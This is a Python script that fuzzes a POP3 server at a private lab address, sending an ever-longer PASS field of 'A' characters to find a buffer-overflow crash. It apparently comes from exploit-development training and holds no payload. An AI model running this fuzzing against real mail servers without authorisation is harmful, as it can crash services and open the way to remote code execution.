import socket

server = '192.168.1.116'
port = 110
username = 'ustest'
password = 'test'
buffer = "A"*100
while len(buffer) <= 4000:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f"We are trying to fuzz with a length of {len(buffer)}")
        s.connect((server, port))
        response = s.recv(1024).decode()
        s.sendall(f'USER {username}\r\n'.encode())
        response = s.recv(1024).decode()
        s.sendall(f'PASS {buffer}\r\n'.encode())
        response = s.recv(1024).decode()
        s.close()
        print("\n Done!")
        buffer += "A"*200
    except socket.error as e:
        print(f"Socket error: {e}")
        #print("Socket error {}".format(e))
    except Exception as e:
        print(f"Unexpected error: {e}")
        #print("Unexpected error {}".format(e))
        #break